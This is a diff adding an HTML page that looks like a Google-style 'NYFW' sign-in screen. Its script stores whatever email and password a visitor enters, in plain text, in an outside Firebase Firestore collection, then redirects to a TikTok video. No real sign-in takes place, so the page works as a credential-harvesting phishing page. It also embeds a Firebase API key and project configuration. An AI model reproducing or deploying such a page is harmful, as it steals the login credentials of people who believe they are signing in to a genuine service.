@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NYFW Sign In</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e4e7eb 100%);
+        }
+        .container {
+            background-color: white;
+            padding: 48px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .container:hover {
+            transform: translateY(-2px);
+        }
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 24px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        p {
+            font-size: 16px;
+            font-weight: 300;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+        .input-container {
+            position: relative;
+            margin: 16px 0;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+        }
+        .input-field::placeholder {
+            color: #8f9194;
+            font-weight: 300;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 6px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 24px;
+            transition: background-color 0.2s ease, transform 0.2s ease;
+        }
+        .btn:hover {
+            background-color: #174ea6;
+            transform: translateY(-1px);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            font-weight: 400;
+            margin-top: 12px;
+            display: none;
+        }
+        .toggle {
+            color: #1a73e8;
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            margin-top: 16px;
+            display: inline-block;
+            transition: color 0.2s ease;
+        }
+        .toggle:hover {
+            color: #174ea6;
+            text-decoration: underline;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 24px;
+                margin: 16px;
+                max-width: 100%;
+            }
+            .logo {
+                width: 100px;
+                height: 100px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://p16-sign-va.tiktokcdn.com/tos-maliva-avt-0068/724ff32cea87811db37d119a3ce89ceb~tplv-tiktokx-cropcenter:1080:1080.jpeg?dr=10399&refresh_token=a9eef568&x-expires=1748973600&x-signature=vH%2FqoSBr67Y7zE6%2ByxZ%2BoZCszzU%3D&t=4d5b0474&ps=13740610&shp=a5d48078&shcp=81f88b70&idc=no1a" alt="NYFW" class="logo">
+        <h1 id="title">Sign in</h1>
+        <p id="subtitle">to continue to NYFW</p>
+        <div class="input-container">
+            <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+        </div>
+        <div class="input-container">
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+        </div>
+        <p id="error" class="error">Something went wrong. Please try again.</p>
+        <button id="actionBtn" class="btn">Sign in</button>
+        <a id="toggleLink" class="toggle">Create account</a>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js';
+        import { getFirestore, collection, doc, setDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js';
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAFRMrgeMfFRWno_VIF8QLMmrHG7o0ZkUY",
+            authDomain: "webapp-87f32.firebaseapp.com",
+            projectId: "webapp-87f32",
+            storageBucket: "webapp-87f32.firebasestorage.app",
+            messagingSenderId: "349767836675",
+            appId: "1:349767836675:web:0f805faea4112c4b799a36",
+            measurementId: "G-E58NDKVSKV"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // DOM elements
+        const title = document.getElementById('title');
+        const subtitle = document.getElementById('subtitle');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const actionBtn = document.getElementById('actionBtn');
+        const toggleLink = document.getElementById('toggleLink');
+        const errorMsg = document.getElementById('error');
+
+        let isSignIn = true;
+
+        // Toggle between sign-in and sign-up
+        toggleLink.addEventListener('click', () => {
+            isSignIn = !isSignIn;
+            title.textContent = isSignIn ? 'Sign in' : 'Create account';
+            subtitle.textContent = isSignIn ? 'to continue to NYFW' : 'to join NYFW';
+            actionBtn.textContent = isSignIn ? 'Sign in' : 'Create account';
+            toggleLink.textContent = isSignIn ? 'Create account' : 'Sign in';
+            errorMsg.style.display = 'none';
+            emailInput.value = '';
+            passwordInput.value = '';
+        });
+
+        // Handle form submission
+        actionBtn.addEventListener('click', async () => {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!email || !password) {
+                errorMsg.textContent = 'Please fill in all fields.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            try {
+                // Save to Firestore
+                await setDoc(doc(collection(db, 'users'), email), {
+                    email: email,
+                    password: password, // Note: Storing passwords in plain text is not secure
+                    timestamp: serverTimestamp()
+                });
+
+                // Redirect to TikTok link
+                window.location.href = 'https://www.tiktok.com/@newyork_cityvibes/video/7492533194366012702?is_from_webapp=1&sender_device=pc&web_id=7511044293293884950';
+            } catch (error) {
+                errorMsg.textContent = 'Error: ' + error.message;
+                errorMsg.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
